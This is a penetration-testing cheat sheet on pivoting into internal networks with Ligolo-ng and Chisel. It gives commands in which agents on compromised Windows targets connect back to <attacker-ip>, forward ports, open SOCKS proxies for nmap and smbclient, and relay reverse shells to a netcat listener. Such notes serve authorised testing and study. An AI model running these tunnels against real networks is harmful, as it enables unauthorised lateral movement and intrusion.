# Ligolo-ng & Chisel

| Tool | Best for | Agent required on target |
|---|---|---|
| Ligolo-ng | Full network pivot with routing table | Yes (agent binary) |
| Chisel | Single port forward, quick setup | Yes (chisel binary) |
| SSH `-L` / `-R` | When SSH is available | No |
| `socat` | Simple one-shot relay | Yes (socat binary) |
| `sshuttle` | Full VPN over SSH from attacker machine | No (attacker-side only) |

!!! tip "Tip"
    Ligolo-ng is the fastest way to pivot to an internal network — once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.

---

## Ligolo-ng

### 1. Extract Binaries

```bash
tar -xzvf ligolo-ng_agent_VERSION_HARDWARE.tar.gz
tar -xzvf ligolo-ng_proxy_VERSION_HARDWARE.tar.gz
```

### 2. Configure TUN Interface (Attacker)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

### 3. Start Proxy (Attacker)

```bash
./proxy -laddr 0.0.0.0:9001 -selfcert
```

### 4. Start Agent (Target)

```bash
.\agent.exe -connect <attacker-ip>:9001 -ignore-cert
```

### 5. Establish the Tunnel

```bash
ligolo-ng >> session
ligolo-ng >> ifconfig
ligolo-ng >> start
```

### 6. Add Route to Internal Network

```bash
sudo ip route add 172.16.4.0/24 dev ligolo
```

### Adding Listeners

To catch callbacks from internal hosts through the tunnel:

```bash
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```

Example scenario — MS01 (192.168.149.150) is compromised and bridges to MS02 (10.10.110.45) and DC01 (10.10.110.44). After routing the internal subnet through Ligolo-ng, set up a listener on the agent to forward reverse shell connections from MS02 back to your Kali netcat listener.

---

## Chisel

### 1. Extract Binary

```bash
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
```

### 2. Start Server (Attacker)

```bash
chisel server -p 8080 --reverse
```

### 3. Start Client (Target) — Single Port Forward

```bash
.\chisel.exe client <attacker-ip>:8080 R:3306:127.0.0.1:3306
```

### 4. Connect to Forwarded Service

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

### SOCKS5 Proxy Mode

```bash
.\chisel.exe client <attacker-ip>:8080 R:socks
```

Add to `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 1080
```

Route tools through the tunnel:

```bash
proxychains nmap -sT -p445 10.4.50.215
proxychains smbclient -L //10.4.50.215/ -U <user>
```
